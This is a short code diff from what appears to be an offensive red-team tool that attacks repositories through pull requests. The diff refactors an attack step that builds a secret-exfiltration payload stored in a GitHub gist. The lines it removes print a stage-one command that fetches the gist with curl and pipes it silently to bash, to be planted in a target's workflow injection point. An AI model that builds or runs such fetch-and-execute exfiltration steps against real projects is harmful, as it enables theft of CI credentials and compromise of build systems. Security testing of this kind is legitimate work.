@@ -52,7 +52,7 @@ class PullRequest(AttackStep):
         self.pr_title = pr_title
         self.timeout = timeout
 
-    def preflight(self, api, previous_results={}):
+    def setup(self, api):
         """
         Validates preconditions for executing the PullRequest step.
 
@@ -121,31 +121,14 @@ class PullRequest(AttackStep):
             Output.error("Failed to check for target branch!")
             return False
 
-        catcher_gist = "".join(random.choices(string.ascii_lowercase, k=5))
-
-        payload = Payloads.create_exfil_payload(
-            self.exfil_credential, catcher_gist, 600  # Sleep for 10 mins.
+        catcher_gist, gist_id = AttackUtilities.create_exfil_gist(
+            api, self.exfil_credential
         )
-
-        gist_id = AttackUtilities.create_gist(api, payload)
 
         self.output["catcher_gist"] = catcher_gist
         self.output["exfil_gist"] = gist_id
 
-        Output.info(f"Generated secret exfil payload at Gist ID: {gist_id}")
-
-        Output.info(
-            f"Stage one generated, please place in injection point you defined in template YAML:\n"
-        )
-
-        print(
-            f"curl -s https://api.github.com/gists/{gist_id} | jq -r '.files[].content' | bash > /dev/null 2>&1\n"
-        )
-
-        Output.warn(
-            "It is your responsibility to place the payload in a runnable form!"
-        )
-        Output.info("Enter 'Confirm' when you are ready.")
+        Output.info("Enter 'Confirm' when ready to continue.")
 
         user_input = input()
         if user_input.lower() != "confirm":
